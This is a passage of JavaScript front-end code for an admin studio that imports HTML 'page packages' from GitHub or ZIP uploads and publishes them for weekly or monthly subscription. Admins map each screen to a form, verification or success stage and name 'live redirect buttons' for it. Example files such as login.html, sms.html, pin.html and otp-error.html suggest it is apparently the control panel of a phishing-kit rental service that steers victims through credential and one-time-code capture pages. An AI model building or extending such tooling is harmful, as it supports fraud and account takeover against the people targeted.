  const sources = Array.from(new Set(adminPackages.map((page) => page.sourceType || "upload"))).sort();
  const filtered = adminPackages.filter((page) => {
    const searchText = [page.name, page.slug, page.id, page.version].join(" ").toLowerCase();
    return (!state.search || searchText.includes(state.search.toLowerCase()))
      && (state.status === "all" || String(page.status).toLowerCase() === state.status)
      && (state.source === "all" || String(page.sourceType || "upload").toLowerCase() === state.source);
  }).sort((a, b) => {
    if (state.sort === "name") return String(a.name).localeCompare(String(b.name));
    if (state.sort === "price") return billingPrice(b, "weekly") - billingPrice(a, "weekly");
    if (state.sort === "subscribers") return packageSubscriberCount(b) - packageSubscriberCount(a);
    return String(b.updatedAt || b.createdAt || "").localeCompare(String(a.updatedAt || a.createdAt || ""));
  });
  const counts = {
    published: adminPackages.filter((page) => page.status === "published").length,
    draft: adminPackages.filter((page) => page.status === "draft").length,
    review: adminPackages.filter((page) => page.status === "review").length,
    archived: adminPackages.filter((page) => page.status === "archived").length
  };
  const rows = filtered.map((page) => {
    const subscribers = packageSubscriberCount(page);
    return `<article class="admin-package-row package-library-row">
      <div><strong>${escapeHtml(page.name)}</strong><span>${escapeHtml(page.slug)} / ${escapeHtml(page.version || "v1")}</span></div>
      <em>${escapeHtml(page.status || "draft")}</em>
      <small>${escapeHtml(page.source || page.sourceType || "upload")}</small>
      <div class="feature-row"><span>${formatMoney(page.billingPeriods?.weekly ?? 0)}/week</span><span>${subscribers} subscriber${subscribers === 1 ? "" : "s"}</span><span>${escapeHtml(String(page.updatedAt || "").slice(0, 10) || "not updated")}</span></div>
      <div class="admin-row-actions">
        <button type="button" data-route="#admin-package-${escapeHtml(page.slug)}">Edit</button>
        <button type="button" data-admin-package-preview="${escapeHtml(page.slug)}">Preview</button>
        ${page.status === "published"
          ? `<button type="button" data-admin-package-status="draft" data-admin-package-key="${escapeHtml(page.slug)}">Unpublish</button>`
          : page.status === "archived" ? "" : `<button type="button" data-admin-package-publish="${escapeHtml(page.slug)}">Publish</button>`}
        ${page.status === "archived"
          ? `<button type="button" data-admin-package-status="draft" data-admin-package-key="${escapeHtml(page.slug)}">Restore</button>`
          : `<button type="button" data-admin-package-status="archived" data-admin-package-key="${escapeHtml(page.slug)}">Archive</button>`}
        ${page.status === "archived" ? `<button type="button" data-admin-package-delete="${escapeHtml(page.slug)}">Delete permanently</button>` : ""}
      </div>
    </article>`;
  }).join("");
  preview.innerHTML = `<section class="app-view">
    <div class="view-heading"><small>admin package library</small><h2>Package Library</h2><p>Search, price, publish, archive, and monitor every package from one view.</p></div>
    ${viewNav([routeButton("#admin", "&#8592; Admin Studio", "primary"), routeButton("#admin-import-local", "Import package"), routeButton("#admin-publishing", "Publishing queue")])}
    <div class="admin-kpis">
      <article><small>Total</small><strong>${adminPackages.length}</strong><span>All packages</span></article>
      <article><small>Published</small><strong>${counts.published}</strong><span>Marketplace live</span></article>
      <article><small>Draft / Review</small><strong>${counts.draft + counts.review}</strong><span>Work in progress</span></article>
      <article><small>Archived</small><strong>${counts.archived}</strong><span>Hidden packages</span></article>
    </div>
    <article class="admin-table-card">
      <div class="builder-heading compact"><div><small>library controls</small><h3>Manage packages</h3></div><button type="button" data-refresh-admin-packages>Refresh</button></div>
      <div class="import-settings-grid">
        <label><span>Search</span><input type="search" data-admin-package-search value="${escapeHtml(state.search)}" placeholder="Name, slug, ID, version"></label>
        <label><span>Status</span><select data-admin-package-filter="status">${["all", "published", "draft", "review", "archived"].map((value) => `<option value="${value}" ${state.status === value ? "selected" : ""}>${value}</option>`).join("")}</select></label>
        <label><span>Source</span><select data-admin-package-filter="source"><option value="all">all</option>${sources.map((value) => `<option value="${escapeHtml(value)}" ${state.source === value ? "selected" : ""}>${escapeHtml(value)}</option>`).join("")}</select></label>
        <label><span>Sort</span><select data-admin-package-filter="sort">${[["updated", "Recently updated"], ["name", "Name"], ["price", "Weekly price"], ["subscribers", "Subscribers"]].map(([value, label]) => `<option value="${value}" ${state.sort === value ? "selected" : ""}>${label}</option>`).join("")}</select></label>
      </div>
      <div class="admin-package-list">${rows || emptyState("No matching packages", "Change the filters or import a new package.", "#admin-import-local")}</div>
    </article>
  </section>`;
  statusText.textContent = `PACKAGE LIBRARY READY / ${filtered.length} SHOWN`;
  topbarTitle.textContent = "Package Library";
}

function renderAdmin() {
  activeFlowSlug = null;
  const publishedCount = adminPackages.filter((page) => String(page.status || page.design).toLowerCase() === "published").length;
  const draftCount = adminPackages.filter((page) => String(page.status || page.design).toLowerCase() !== "published").length;
  const githubCount = adminPackages.filter((page) => page.sourceType === "github" || page.source === "GitHub repo").length;
  const packageRows = adminPackages.length ? adminPackages.map((page) => `
    <article class="admin-package-row">
      <div>
        <strong>${escapeHtml(page.name)}</strong>
        <span>${escapeHtml(page.slug)} / ${escapeHtml(page.version || "v1")}</span>
      </div>
      <em>${escapeHtml(page.status || page.design || "Draft")}</em>
      <small>${escapeHtml(page.source || "Package")}</small>
      <div class="admin-row-actions">
        <button type="button" data-route="#admin-package-${escapeHtml(page.slug)}">Editor</button>
        <button type="button" data-admin-package-preview="${escapeHtml(page.slug)}">Preview</button>
        <button type="button" data-admin-package-publish="${escapeHtml(page.slug)}">Publish</button>
      </div>
    </article>
  `).join("") : emptyState("No packages imported yet", "Connect a GitHub repo or upload a local page bundle to create your first package.", "#admin-import-github");

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin studio</small>
        <h2>Package control center</h2>
        <p>Import pages, review files, publish packages, and manage subscribers from one compact workspace.</p>
      </div>
      ${viewNav([
        routeButton("#pages", "&#8592; Marketplace"),
        routeButton("#my-pages", "My Pages"),
        routeButton("#wallet", "Wallet")
      ])}

      <div class="admin-command-tabs" aria-label="Admin modules">
        <button type="button" class="active" data-route="#admin">Overview</button>
        <button type="button" data-route="#admin-import-github">Import</button>
        <button type="button" data-route="#admin-packages">Packages</button>
        <button type="button" data-route="#admin-users">Users</button>
        <button type="button" data-route="#admin-publishing">Publishing</button>
      </div>

      <div class="admin-kpis">
        <article><small>Packages</small><strong>${String(adminPackages.length).padStart(2, "0")}</strong><span>Total library</span></article>
        <article><small>Published</small><strong>${String(publishedCount).padStart(2, "0")}</strong><span>Marketplace ready</span></article>
        <article><small>Drafts</small><strong>${String(draftCount).padStart(2, "0")}</strong><span>Need review</span></article>
        <article><small>GitHub</small><strong>${String(githubCount).padStart(2, "0")}</strong><span>Repo imports</span></article>
      </div>

      <div class="admin-studio-shell">
        <article class="admin-hero-panel">
          <div>
            <small>next action</small>
            <h3>Publish your first real page package</h3>
            <p>Connect a repo, detect screens, check CSS/assets, then send a clean package to the marketplace for wallet subscriptions.</p>
          </div>
          <div class="admin-actions">
            <button type="button" data-route="#admin-import-github">Import GitHub</button>
            <button type="button" data-route="#admin-import-local">Upload files</button>
            <button type="button" data-route="#admin-users">Users</button>
          </div>
        </article>

        <div class="admin-workbench">
          <article class="admin-table-card">
            <div class="builder-heading compact">
              <div>
                <small>package library</small>
                <h3>Manage packages</h3>
              </div>
              <button type="button" data-refresh-admin-packages>Refresh</button>
            </div>
            <div class="admin-package-list">
              ${packageRows}
            </div>
          </article>

          <aside class="admin-side-stack">
            <article class="security-panel">
              <small>import paths</small>
              <h3>Add a page</h3>
              <div class="admin-compact-grid">
                <button type="button" data-route="#admin-import-github"><strong>GitHub</strong><span>Repo, branch, folder</span></button>
                <button type="button" data-route="#admin-import-local"><strong>Local</strong><span>Zip or loose files</span></button>
              </div>
            </article>

            <article class="security-panel">
              <small>publishing queue</small>
              <h3>Review flow</h3>
              <div class="admin-queue-list">
                <div><span>01</span><strong>Files</strong><em>Detect HTML, CSS, assets</em></div>
                <div><span>02</span><strong>Design</strong><em>Scope CSS and preview</em></div>
                <div><span>03</span><strong>Package</strong><em>Set price and metadata</em></div>
                <div><span>04</span><strong>Publish</strong><em>Send to marketplace</em></div>
              </div>
            </article>
          </aside>
        </div>
      </div>

      <details class="admin-fold">
        <summary>
          <span>Advanced models</span>
          <strong>Package and user configuration reference</strong>
        </summary>
        <div class="model-grid">
          <article class="security-panel">
            <small>package model</small>
            <h3>Package fields</h3>
            <div class="feature-row">
              ${Object.keys(packageDataModel).map((group) => `<span>${group}</span>`).join("")}
            </div>
            <button type="button" data-route="#admin-import-github">Open import wizard</button>
          </article>
          <article class="security-panel">
            <small>user config</small>
            <h3>Subscriber fields</h3>
            <div class="feature-row">
              ${Object.keys(userPageConfigModel).map((group) => `<span>${group}</span>`).join("")}
            </div>
            <button type="button" data-route="#my-pages">Review owned pages</button>
          </article>
        </div>
      </details>
    </section>
  `;
  statusText.textContent = "ADMIN PAGE STUDIO READY";
  topbarTitle.textContent = "Admin";
}

function getAdminPackage(packageSlug) {
  let key = String(packageSlug || "").trim();
  try { key = decodeURIComponent(key); } catch { /* Keep the original route key. */ }
  const normalized = key.toLowerCase();
  return adminPackages.find((item) => (
    String(item.slug || "").toLowerCase() === normalized
    || String(item.id || "").toLowerCase() === normalized
  )) || null;
}

async function fetchAdminPackage(packageSlug) {
  let key = String(packageSlug || "").trim();
  try { key = decodeURIComponent(key); } catch { /* Keep the original route key. */ }
  if (!key) return null;
  const result = await requestApi(`/api/admin/packages/${encodeURIComponent(key)}`);
  const pagePackage = result.package ? normalizePackage(result.package) : null;
  if (pagePackage) adminPackages = [pagePackage, ...adminPackages.filter((item) => item.id !== pagePackage.id)];
  return pagePackage;
}

function shortCommit(value = "") {
  const commit = String(value || "").trim();
  return commit ? commit.slice(0, 8) : "Not recorded";
}

function githubChangeCount(status = {}) {
  const diff = status.fileDiff || {};
  return ["added", "removed", "modified", "renamed"].reduce((total, key) => total + (diff[key]?.length || 0), 0);
}

function githubLivePanelMarkup(page) {
  const github = page.packageManifest?.github || {};
  const status = githubLiveStatusByPackage.get(page.id);
  const storedCommit = status?.storedCommitSha || github.lastSyncedCommitSha || "";
  const currentCommit = status?.currentCommitSha || storedCommit;
  const drift = status?.screenDrift || {};
  const changeCount = githubChangeCount(status);
  const stateLabel = status?.loading
    ? "Checking branch"
    : status?.error
      ? "Check failed"
      : status?.commitChanged || changeCount
        ? drift.hasStructuralChanges ? "Screen review needed" : "Code changes live"
        : status ? "In sync" : "Live branch connected";
  const stateClass = status?.error || drift.hasStructuralChanges ? "warning" : status?.commitChanged || changeCount ? "active" : "ready";
  const folder = github.folder || status?.folder || "repository root";
  const checkedAt = status?.checkedAt ? resultViewerTime(status.checkedAt) : "Not checked in this session";
  const lastSyncedAt = status?.lastSyncedAt || github.lastSyncedAt;
  const hasChanges = Boolean(status?.commitChanged || changeCount);
  return `
    <article class="security-panel github-live-panel" data-github-live-panel="${escapeHtml(page.id)}">
      <div class="github-live-heading">
        <div>
          <small>live github source</small>
          <h3>${escapeHtml(status?.repo || `${github.owner || ""}/${github.repo || ""}`)}</h3>
          <p><code>${escapeHtml(status?.branch || github.branch || "main")}</code> / ${escapeHtml(folder)}</p>
        </div>
        <span class="github-live-state ${stateClass}">${escapeHtml(stateLabel)}</span>
      </div>
      ${status?.error ? `<p class="github-live-error">${escapeHtml(status.error)}</p>` : `
        <div class="github-live-stats">
          <div><small>Tracked</small><strong>${escapeHtml(shortCommit(storedCommit))}</strong><span>${lastSyncedAt ? `Synced ${escapeHtml(resultViewerTime(lastSyncedAt))}` : "Baseline from import"}</span></div>
          <div><small>Latest</small><strong>${escapeHtml(shortCommit(currentCommit))}</strong><span>Checked ${escapeHtml(checkedAt)}</span></div>
          <div><small>Files</small><strong>${changeCount}</strong><span>${status ? `${status.fileDiff?.added?.length || 0} added / ${status.fileDiff?.removed?.length || 0} removed / ${status.fileDiff?.modified?.length || 0} edited` : "Awaiting branch check"}</span></div>
          <div><small>Screens</small><strong>${(drift.addedScreens?.length || 0) + (drift.missingScreens?.length || 0) + (drift.renamedScreens?.length || 0) + (drift.restoredScreens?.length || 0)}</strong><span>${drift.addedScreens?.length || 0} new / ${drift.missingScreens?.length || 0} missing / ${drift.renamedScreens?.length || 0} renamed / ${drift.restoredScreens?.length || 0} restored</span></div>
        </div>
      `}
      <p class="github-live-note">Page code is read from this mutable branch at runtime. Apply sync only when you want to accept its current file inventory and review changed screen mappings.</p>
      <div class="admin-actions">
        <button type="button" data-github-live-check="${escapeHtml(page.id)}" ${status?.loading ? "disabled" : ""}>${status?.loading ? "Checking..." : "Check GitHub"}</button>
        <button type="button" class="primary" data-github-live-sync="${escapeHtml(page.id)}" ${!hasChanges || status?.loading || status?.error ? "disabled" : ""}>Apply screen sync</button>
      </div>
    </article>
  `;
}

function refreshGitHubLivePanel(page) {
  const panel = [...preview.querySelectorAll("[data-github-live-panel]")]
    .find((item) => item.dataset.githubLivePanel === page.id);
  if (panel) panel.outerHTML = githubLivePanelMarkup(page);
}

async function checkAdminPackageGitHub(page) {
  if (!page) throw new Error("Package not found");
  const current = githubLiveStatusByPackage.get(page.id);
  if (current?.loading) return;
  githubLiveStatusByPackage.set(page.id, { ...(current || {}), loading: true, error: "" });
  refreshGitHubLivePanel(page);
  try {
    const result = await requestApi(`/api/admin/packages/${encodeURIComponent(page.id || page.slug)}/github/status`);
    githubLiveStatusByPackage.set(page.id, { ...result.status, loading: false });
  } catch (error) {
    githubLiveStatusByPackage.set(page.id, { ...(current || {}), loading: false, error: error.message });
  }
  refreshGitHubLivePanel(page);
}

async function syncAdminPackageGitHub(page) {
  if (!page) throw new Error("Package not found");
  const result = await requestApi(`/api/admin/packages/${encodeURIComponent(page.id || page.slug)}/github/sync`, { method: "POST" });
  const updated = normalizePackage(result.package);
  adminPackages = adminPackages.map((item) => item.id === updated.id ? updated : item);
  marketPages = adminPackages.filter((item) => item.status === "published");
  githubLiveStatusByPackage.set(updated.id, { ...result.status, loading: false });
  await renderAdminPackageEditor(updated.slug);
  statusText.textContent = result.status?.packageMovedToReview
    ? "GITHUB SCREENS SYNCED / PACKAGE MOVED TO REVIEW"
    : "GITHUB SOURCE SYNCED";
}

function renderAdminImportWizard(sourceType = "local") {
  activeFlowSlug = null;
  const isGithub = sourceType === "github";
  const sourceLabel = isGithub ? "GitHub repository" : "Local bundle";
  const importChecks = [
    ["Source", isGithub ? "Repo URL, branch, folder" : "Zip or loose files"],
    ["Files", "HTML, CSS, JS, media"],
    ["Screens", "Name buttons, stage, state, order"],
    ["Preview", "Sandbox before publish"],
    ["Publish", "Marketplace visibility"]
  ];
  const starterFiles = isGithub
    ? ["index.html", "login2.html", "sms.html", "sms2.html", "pin.html"]
    : ["start.htm", "login.html", "otp-error.html", "success.html", "assets/logo.svg"];

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin import wizard</small>
        <h2>${sourceLabel}</h2>
        <p>Bring in any HTML page set, then name and arrange every redirect screen before publishing.</p>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#admin-import-local", "Local upload"),
        routeButton("#admin-import-github", "GitHub import")
      ])}

      <div class="wizard-progress">
        ${importChecks.map(([label], index) => `<span class="${index === 0 ? "active" : ""}">${index + 1} ${label}</span>`).join("")}
      </div>

      <div class="import-workbench">
        <article class="security-panel package-form">
          <small>source</small>
          <h3>${isGithub ? "Connect GitHub" : "Local upload staging"}</h3>
          <div class="admin-source-grid compact">
            <button class="${isGithub ? "" : "active"}" type="button" data-route="#admin-import-local">Local bundle</button>
            <button class="${isGithub ? "active" : ""}" type="button" data-route="#admin-import-github">GitHub repo</button>
          </div>
          ${isGithub ? `
            <label><span>Repository URL</span><input type="url" data-github-field="repoUrl" placeholder="https://github.com/owner/repo"></label>
            <label><span>Branch</span><input type="text" data-github-field="branch" placeholder="Leave blank for default branch"></label>
            <label><span>Folder path</span><input type="text" data-github-field="folder" placeholder="pages/page-a or leave blank"></label>
            <div class="import-settings-grid">
              <label><span>Package name</span><input type="text" data-github-field="packageName" value="GitHub Imported Page"></label>
              <label><span>Slug</span><input type="text" data-github-field="slug" value="github-imported-page"></label>
            </div>
            <div class="admin-actions">
              <button type="button" data-github-scan>Scan repo</button>
              <button type="button" data-github-import>Create draft & map screens</button>
            </div>
          ` : `
            <div class="import-settings-grid">
              <label><span>Package name</span><input type="text" data-local-field="packageName" value="Local Imported Page"></label>
              <label><span>Slug</span><input type="text" data-local-field="slug" value="local-imported-page"></label>
            </div>
            <label><span>Upload ZIP</span><input type="file" accept=".zip,application/zip" data-local-zip></label>
            <label><span>Upload individual files</span><input type="file" multiple data-local-files></label>
            <label><span>Upload a folder</span><input type="file" multiple webkitdirectory directory data-local-folder></label>
            <div class="feature-row">
              <span>Private R2 storage</span>
              <span>PHP rejected</span>
              <span>100 MB package limit</span>
              <span>Versioned source</span>
            </div>
            <div class="admin-actions">
              <button type="button" data-local-import="draft">Upload draft & map screens</button>
            </div>
          `}
        </article>

        <article class="security-panel import-result-panel">
          <small>live result</small>
          <h3>Scan and preview</h3>
          <div class="admin-code-sample" data-github-result>
            <code>${isGithub ? `API connection required: ${escapeHtml(apiBase())}` : "R2 connection required. Select one ZIP, loose files, or a folder."}</code>
            <code>${isGithub ? "Scan a repo to detect screens, CSS, scripts, and assets." : "At least one .html or .htm file is required. PHP and unsafe paths are rejected."}</code>
          </div>
        </article>

        <article class="security-panel">
          <small>review</small>
          <h3>Import checklist</h3>
          <div class="admin-queue-list">
            ${importChecks.map(([label, hint], index) => `
              <div>
                <span>${String(index + 1).padStart(2, "0")}</span>
                <strong>${label}</strong>
                <em>${hint}</em>
              </div>
            `).join("")}
          </div>
        </article>

        <article class="security-panel">
          <small>expected map</small>
          <h3>Example file set</h3>
          <div class="file-map-list">
            ${starterFiles.map((file, index) => `
              <div>
                <strong>${String(index + 1).padStart(2, "0")}</strong>
                <span>${file}</span>
                <em>${file.endsWith(".css") ? "CSS" : file.includes("assets") ? "Asset" : "HTML"}</em>
              </div>
            `).join("")}
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = `${sourceLabel.toUpperCase()} IMPORT WIZARD READY`;
  topbarTitle.textContent = "Import Wizard";
}

async function renderAdminPackageEditor(packageSlug = "page-a") {
  activeFlowSlug = null;
  let page = getAdminPackage(packageSlug);
  let loadError = "";
  if (!page && isAdmin()) {
    preview.innerHTML = `<section class="app-view"><div class="view-heading"><small>package editor</small><h2>Loading package…</h2><p>Resolving the package record from the admin API.</p></div></section>`;
    try { page = await fetchAdminPackage(packageSlug); }
    catch (error) { loadError = error.message; }
  }
  if (!page) {
    preview.innerHTML = `
      <section class="app-view">
        <div class="view-heading">
          <small>package editor</small>
          <h2>No package loaded</h2>
          <p>${loadError ? `The package API could not load this record: ${escapeHtml(loadError)}` : "Create or import a package first. The editor only opens real package records from the API."}</p>
        </div>
        ${viewNav([routeButton("#admin", "Back to admin", "primary"), routeButton("#admin-import-github", "Import GitHub")])}
        ${emptyState("No package record", "Publish a package from the admin studio to edit its screens, CSS, pricing, and release settings.", "#admin")}
      </section>
    `;
    statusText.textContent = "PACKAGE RECORD REQUIRED";
    topbarTitle.textContent = "Package Editor";
    return;
  }

  const thumbnailUrl = packageThumbnailUrl(page);
  const thumbnailLabel = page.thumbnailDataUrl ? "Manual thumbnail active" : page.thumbnailPath ? page.thumbnailPath : "No thumbnail override";
  const configuredScreens = (page.packageManifest?.screens || []).filter((item) => typeof item === "object" && (item.file || item.path));
  const htmlFiles = (page.packageManifest?.files || [])
    .map((item) => item?.path || item?.file || item)
    .filter((file) => /\.html?$/i.test(String(file || "")));
  const availableHtmlFiles = new Set(htmlFiles.map((file) => String(file).toLowerCase()));
  const editorFiles = Array.from(new Set([
    ...configuredScreens.map((item) => item.file || item.path),
    ...htmlFiles
  ].filter(Boolean)));
  const editorScreens = editorFiles.map((file, index) => {
    const configured = configuredScreens.find((item) => String(item.file || item.path).toLowerCase() === String(file).toLowerCase()) || {};
    const buttonLabel = configured.buttonLabel || configured.label || configured.name || sessionTargetLabel({ file }, file);
    const text = `${buttonLabel} ${file}`.toLowerCase();
    const legacyRole = String(configured.role || "").toLowerCase();
    const stage = configured.stage
      || (["form", "verification", "success", "other"].includes(legacyRole) ? legacyRole : "")
      || (/success|complete|thanks|redirect/.test(text) ? "success" : /otp|verify|sms|pin|code|confirm/.test(text) ? "verification" : /login|signin|email|form|info|index/.test(text) ? "form" : "other");
    const state = configured.state
      || (/error|invalid|wrong|failed/.test(text) || /(?:^|[-_])2\.html?$/i.test(file) ? "error" : /retry|again/.test(text) ? "retry" : "default");
    const fallbackId = `scr_${page.slug}_${index + 1}`.replace(/[^a-zA-Z0-9_-]/g, "_").slice(0, 80);
    return {
      ...configured,
      id: configured.id || fallbackId,
      file,
      buttonLabel,
      stage,
      state,
      enabled: configured.enabled !== false,
      showInRedirects: configured.showInRedirects !== false,
      needsReview: configured.needsReview === true,
      missing: !availableHtmlFiles.has(String(file).toLowerCase())
    };
  });
  const isLiveGithub = page.sourceType === "github" && Boolean(page.packageManifest?.github);
  const packageSourceSummary = [page.source, page.cssMode, page.repo].filter(Boolean).join(" / ");
  const configuredEntryId = page.packageManifest?.entryScreenId
    || editorScreens.find((screen) => screen.role === "entry")?.id
    || editorScreens.find((screen) => /(^|\/)index\.html?$/i.test(screen.file))?.id
    || editorScreens[0]?.id
    || "";
  const configuredFinalId = page.packageManifest?.finalScreenId
    || editorScreens.find((screen) => screen.stage === "success")?.id
    || "";

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>package editor</small>
        <h2>${page.name}</h2>
        <p>Edit package details, map imported files, tune CSS/design tokens, and prepare the next publishable version.</p>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#pages", "Marketplace"),
        routeButton("#my-pages", "My Pages")
      ])}

      <article class="admin-package-card">
        <div>
          <small>${page.status}</small>
          <h3>${page.name} ${page.version}</h3>
          <p>${escapeHtml(packageSourceSummary)}</p>
        </div>
        <div class="admin-actions">
          <button type="button" data-save-admin-package="${escapeHtml(page.slug)}">Save draft</button>
          <button type="button" data-admin-package-preview="${escapeHtml(page.slug)}">Preview</button>
          <button type="button" data-admin-package-publish="${escapeHtml(page.slug)}">Publish</button>
        </div>
      </article>

      <div class="package-editor-grid">
        ${isLiveGithub ? githubLivePanelMarkup(page) : ""}

        <article class="security-panel package-form">
          <small>package details</small>
          <h3>Listing settings</h3>
          <label><span>Package ID</span><input type="text" value="${escapeHtml(page.id)}" readonly></label>
          <label><span>Package name</span><input type="text" data-package-field="name" value="${escapeHtml(page.name)}"></label>
          <label><span>Slug</span><input type="text" data-package-field="slug" value="${escapeHtml(page.slug)}"></label>
          <label><span>Package type</span><input type="text" data-package-field="type" value="${escapeHtml(page.type)}"></label>
          <label><span>Version</span><input type="text" data-package-field="version" value="${escapeHtml(page.version)}"></label>
          <label><span>Source type</span><input type="text" data-package-field="sourceType" value="${escapeHtml(page.sourceType)}"></label>
          <label><span>Source path</span><input type="text" data-package-field="repoUrl" value="${escapeHtml(page.repo)}"></label>
          <label><span>Status</span><select data-package-field="status">${["draft", "review", "published", "archived"].map((status) => `<option value="${status}" ${String(page.status).toLowerCase() === status ? "selected" : ""}>${status}</option>`).join("")}</select></label>
        </article>

        <article class="security-panel package-form thumbnail-uploader">
          <small>thumbnail</small>
          <h3>Marketplace image</h3>
          <div class="thumbnail-preview">
            ${thumbnailUrl ? `<img src="${escapeHtml(thumbnailUrl)}" alt="${escapeHtml(page.name)} thumbnail">` : `<span>${escapeHtml(pageInitials(page.name))}</span>`}
          </div>
          <label>
            <span>Upload thumbnail</span>
            <input type="file" accept="image/png,image/jpeg,image/webp,image/svg+xml" data-package-thumbnail="${escapeHtml(page.slug)}">
          </label>
          <code>${escapeHtml(thumbnailLabel)}</code>
        </article>

        <article class="security-panel package-form">
          <small>billing periods</small>
          <h3>Subscription prices</h3>
          <label><span>Daily</span><input type="number" min="0" max="100000" step="0.01" data-package-price="daily" value="${page.billingPeriods.daily}"></label>
          <label><span>Weekly</span><input type="number" min="0" max="100000" step="0.01" data-package-price="weekly" value="${page.billingPeriods.weekly}"></label>
          <label><span>Biweekly</span><input type="number" min="0" max="100000" step="0.01" data-package-price="biweekly" value="${page.billingPeriods.biweekly}"></label>
          <label><span>Monthly</span><input type="number" min="0" max="100000" step="0.01" data-package-price="monthly" value="${page.billingPeriods.monthly}"></label>
        </article>

        <article class="security-panel package-form">
          <small>design tokens</small>
          <h3>CSS controls</h3>
          <label><span>Brand color</span><input type="text" data-package-token="brand" value="${escapeHtml(page.tokens.brand || "")}"></label>
          <label><span>Font family</span><input type="text" data-package-token="font" value="${escapeHtml(page.tokens.font || "")}"></label>
          <label><span>Border radius</span><input type="text" data-package-token="radius" value="${escapeHtml(page.tokens.radius || "")}"></label>
          <label><span>Description</span><textarea data-package-field="description">${escapeHtml(page.description || "")}</textarea></label>
        </article>

        <article class="security-panel screen-mapping-panel">
          <small>file mapping</small>
          <h3>Imported screens</h3>
          <p>Name the live redirect buttons, group each screen by stage, and choose entry/final independently from file order.</p>
          <label class="screen-final-none"><input type="radio" name="package-final-screen" data-package-screen-final-none ${configuredFinalId ? "" : "checked"}> No final screen</label>
          <div class="file-map-list">
            ${editorScreens.map((screen, index) => `
              <div class="screen-map-row ${screen.needsReview ? "needs-review" : ""} ${screen.missing ? "is-missing" : ""}" draggable="true" data-package-screen-row="${escapeHtml(screen.id)}" data-package-screen-id="${escapeHtml(screen.id)}" data-package-screen-file="${escapeHtml(screen.file)}">
                <strong title="Drag to reorder">&#8942;&#8942; ${String(index + 1).padStart(2, "0")}</strong>
                <div class="screen-map-file">
                  <div class="screen-map-file-heading">
                    <span>${escapeHtml(screen.file)}</span>
                    ${screen.missing ? `<b class="screen-sync-badge missing">Missing from branch</b>` : screen.needsReview ? `<b class="screen-sync-badge review">Needs review</b>` : ""}
                  </div>
                  <label><small>Redirect button name</small><input type="text" maxlength="80" data-package-screen-label value="${escapeHtml(screen.buttonLabel)}"></label>
                </div>
                <label class="screen-map-stage"><small>Stage</small><select data-package-screen-stage>${["form", "verification", "success", "other"].map((stage) => `<option value="${stage}" ${screen.stage === stage ? "selected" : ""}>${stage}</option>`).join("")}</select></label>
                <label class="screen-map-state"><small>State</small><select data-package-screen-state>${["default", "error", "retry", "alternate"].map((state) => `<option value="${state}" ${screen.state === state ? "selected" : ""}>${state}</option>`).join("")}</select></label>
                <div class="screen-map-flags">
                  <label><input type="radio" name="package-entry-screen" data-package-screen-entry ${screen.id === configuredEntryId ? "checked" : ""}> Entry</label>
                  <label><input type="radio" name="package-final-screen" data-package-screen-final ${screen.id === configuredFinalId ? "checked" : ""}> Final</label>
                  <label><input type="checkbox" data-package-screen-enabled ${screen.enabled ? "checked" : ""}> Enabled</label>
                  <label><input type="checkbox" data-package-screen-redirect ${screen.showInRedirects ? "checked" : ""}> Redirect</label>
                </div>
                <em>${screen.id === configuredEntryId ? "Entry" : screen.id === configuredFinalId ? "Final" : "Screen"}</em>
                <span class="screen-order-actions"><button type="button" data-package-screen-move="up" aria-label="Move ${escapeHtml(screen.buttonLabel)} up">&#8593;</button><button type="button" data-package-screen-move="down" aria-label="Move ${escapeHtml(screen.buttonLabel)} down">&#8595;</button>${screen.missing ? `<button type="button" class="danger" data-package-screen-remove aria-label="Remove missing ${escapeHtml(screen.buttonLabel)} mapping">Remove</button>` : ""}</span>
              </div>
            `).join("")}
          </div>
        </article>

        <article class="security-panel">
          <small>assets and css files</small>
          <h3>Source inventory</h3>
          <div class="feature-row">
            ${page.assets.map((asset) => `<span>${asset}</span>`).join("")}
            ${page.cssFiles.map((cssFile) => `<span>${cssFile}</span>`).join("")}
            <span>${page.inlineCssBlocks} inline CSS blocks</span>
          </div>
        </article>

        <article class="security-panel">
          <small>css inspection</small>
          <h3>Normalization status</h3>
          <div class="pipeline-steps">
            <span class="done">HTML parsed</span>
            <span class="done">${page.cssMode}</span>
            <span class="${page.design === "Needs review" ? "active" : "done"}">${page.design}</span>
            <span>Preview required</span>
            <span>Publish ready</span>
          </div>
        </article>

        <article class="security-panel">
          <small>version history</small>
          <h3>Release controls</h3>
          <div class="traffic-log">
            <div><span>${page.version}</span><strong>Current</strong><em>${page.status}</em><small>Latest working version for this package.</small></div>
            <div><span>new</span><strong>Updated</strong><em>${page.updatedAt.slice(0, 10)}</em><small>Last package metadata update.</small></div>
            <div><span>old</span><strong>Created</strong><em>${page.createdAt.slice(0, 10)}</em><small>Original package import date.</small></div>
            <div><span>prev</span><strong>Rollback</strong><em>Ready</em><small>Keep the previous package build available for recovery.</small></div>
            <div><span>next</span><strong>Draft</strong><em>Queued</em><small>Save edits as the next version before publishing.</small></div>
          </div>
        </article>

        <article class="security-panel package-preview-card">
          <small>preview</small>
          <h3>Design match preview</h3>
          <div style="--package-accent: ${page.tokens.brand}" class="mini-page-preview">
            <span>${page.name}</span>
            <strong>${page.cssMode}</strong>
            <button type="button">Sample CTA</button>
          </div>
        </article>
      </div>
    </section>
  `;

  refreshImportedScreenOrder();
  const knownGithubStatus = githubLiveStatusByPackage.get(page.id);
  const githubStatusAge = Date.now() - new Date(knownGithubStatus?.checkedAt || 0).getTime();
  if (isLiveGithub && (!knownGithubStatus || knownGithubStatus.error || githubStatusAge > 30000) && !knownGithubStatus?.loading) {
    void checkAdminPackageGitHub(page);
  }
  statusText.textContent = `${page.name.toUpperCase()} PACKAGE EDITOR OPEN`;
  topbarTitle.textContent = `${page.name} Editor`;
}

function renderAdminUsers() {
  activeFlowSlug = null;
  const canManageAccounts = isAdmin();
  const canAdjustWallets = isAdmin();
  const canReviewFunding = hasAdminCapability("walletReview");
  const canEditUserPages = hasAdminCapability("pageEditor");
  const activeCount = adminUsers.filter((user) => String(user.status).toLowerCase() === "active").length;
  const reviewCount = adminUsers.filter((user) => String(user.status).toLowerCase() === "review").length;
  const activeFunding = adminDepositRequests.filter((request) => ["pending", "reviewing"].includes(request.status));
